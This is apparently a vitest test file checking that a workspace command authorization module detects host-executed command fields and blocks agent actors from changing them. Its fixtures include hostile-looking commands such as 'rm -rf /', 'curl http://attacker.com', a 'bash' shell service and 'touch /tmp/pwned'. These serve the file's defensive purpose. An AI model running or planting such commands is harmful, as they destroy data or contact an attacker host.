import { describe, expect, it, vi } from "vitest";
import {
  collectProjectExecutionWorkspaceCommandPaths,
  collectProjectWorkspaceCommandPaths,
  collectIssueWorkspaceCommandPaths,
  collectExecutionWorkspaceCommandPaths,
  assertNoAgentHostWorkspaceCommandMutation,
} from "../routes/workspace-command-authz.js";

describe("Workspace Command Authorization Security", () => {
  const agentRequest = {
    actor: {
      type: "agent",
      agentId: "agent-123",
      companyId: "company-1",
    },
  } as any;

  const boardRequest = {
    actor: {
      type: "board",
      companyId: "company-1",
    },
  } as any;

  describe("collectProjectWorkspaceCommandPaths", () => {
    it("detects commands in runtimeConfig.workspaceRuntime", () => {
      const patch = {
        runtimeConfig: {
          workspaceRuntime: {
            services: [{ name: "malicious", command: "rm -rf /" }],
            jobs: [{ name: "exploit", command: "curl http://attacker.com" }],
            commands: [{ name: "shell", kind: "service", command: "bash" }],
          },
        },
      };

      const paths = collectProjectWorkspaceCommandPaths(patch, "workspace");
      expect(paths).toContain("workspace.runtimeConfig.workspaceRuntime.services.0.command");
      expect(paths).toContain("workspace.runtimeConfig.workspaceRuntime.jobs.0.command");
      expect(paths).toContain("workspace.runtimeConfig.workspaceRuntime.commands.0.command");
    });

    it("blocks Agent from modifying runtimeConfig commands", () => {
      const patch = {
        runtimeConfig: {
          workspaceRuntime: {
            services: [{ name: "malicious", command: "rm -rf /" }],
          },
        },
      };

      const paths = collectProjectWorkspaceCommandPaths(patch, "workspace");
      expect(() => assertNoAgentHostWorkspaceCommandMutation(agentRequest, paths)).toThrow(
        /Agent keys cannot modify host-executed workspace commands/,
      );
    });

    it("allows Board to modify runtimeConfig commands", () => {
      const patch = {
        runtimeConfig: {
          workspaceRuntime: {
            services: [{ name: "legit", command: "npm start" }],
          },
        },
      };

      const paths = collectProjectWorkspaceCommandPaths(patch, "workspace");
      expect(() => assertNoAgentHostWorkspaceCommandMutation(boardRequest, paths)).not.toThrow();
    });
  });

  describe("collectProjectExecutionWorkspaceCommandPaths", () => {
    it("detects commands in executionWorkspacePolicy", () => {
      const policy = {
        workspaceStrategy: { provisionCommand: "ls" },
        workspaceRuntime: {
          services: [{ command: "id" }],
        },
      };

      const paths = collectProjectExecutionWorkspaceCommandPaths(policy);
      expect(paths).toContain("executionWorkspacePolicy.workspaceStrategy.provisionCommand");
      expect(paths).toContain("executionWorkspacePolicy.workspaceRuntime.services.0.command");
    });
  });

  describe("collectExecutionWorkspaceCommandPaths", () => {
    it("detects commands in execution workspace config", () => {
      const input = {
        config: {
          provisionCommand: "touch /tmp/pwned",
          workspaceRuntime: {
            jobs: [{ command: "whoami" }],
          },
        },
      };

      const paths = collectExecutionWorkspaceCommandPaths(input);
      expect(paths).toContain("config.provisionCommand");
      expect(paths).toContain("config.workspaceRuntime.jobs.0.command");
    });

    it("detects commands in execution workspace metadata config", () => {
      const input = {
        metadata: {
          config: {
            cleanupCommand: "echo cleanup",
            workspaceRuntime: {
              services: [{ command: "node app.js" }],
            },
          },
        },
      };

      const paths = collectExecutionWorkspaceCommandPaths(input);
      expect(paths).toContain("metadata.config.cleanupCommand");
      expect(paths).toContain("metadata.config.workspaceRuntime.services.0.command");
    });
  });

  describe("collectIssueWorkspaceCommandPaths", () => {
    it("detects commands in issue execution workspace settings", () => {
      const input = {
        executionWorkspaceSettings: {
          workspaceStrategy: { teardownCommand: "exit 0" },
          workspaceRuntime: {
            commands: [{ command: "echo issue-scoped" }],
          },
        },
      };

      const paths = collectIssueWorkspaceCommandPaths(input);
      expect(paths).toContain("executionWorkspaceSettings.workspaceStrategy.teardownCommand");
      expect(paths).toContain("executionWorkspaceSettings.workspaceRuntime.commands.0.command");
    });
  });
});
